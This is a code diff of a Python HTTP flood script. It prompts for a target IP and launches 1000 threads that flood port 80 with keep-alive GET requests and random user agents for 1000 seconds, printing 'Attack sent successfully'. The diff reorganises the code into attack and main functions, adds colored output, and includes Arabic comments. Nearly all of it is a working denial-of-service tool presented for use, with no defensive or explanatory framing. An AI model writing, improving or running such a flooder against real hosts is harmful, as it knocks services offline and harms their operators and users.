@@ -2,7 +2,9 @@ import socket
 import time
 import random
 import threading
-from threading import Thread
+from colorama import Fore, init
+
+init()
 
 def UAlist():
     return [
@@ -22,27 +24,29 @@ def UAlist():
         "null"
     ]
 
-def http(ip, port, floodtime):
+def http(ip, floodtime):
     while time.time() < floodtime:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             try:
-                sock.connect((ip, port))
+                sock.connect((ip, 80))
                 while time.time() < floodtime:
                     sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
-                print("Color.LG+f'\n [!] Attack sent successfully!\n'")
+                    print(Fore.LIGHTGREEN_EX + "\n [!] Attack sent successfully!\n")  # الرسالة التي تم إضافتها
             except:
                 sock.close()
 
-def start_attack():
-    ip = input("ip: ")
-    port = 80
+def attack(ip, port, threads, duration):
+    end_time = time.time() + duration
+    for _ in range(threads):
+        threading.Thread(target=http, args=(ip, end_time)).start()
+
+def main():
+    ip = input("Target IP: ")
+    port = 80  # يمكنك تغيير البورت حسب الحاجة
     threads = 1000
     duration = 1000
 
-    
-    
-    for _ in range(threads):
-        Thread(target=http, args=(ip, port, time.time() + duration)).start()
+    attack(ip, port, threads, duration)
 
 if __name__ == "__main__":
-    start_attack()
+    main()
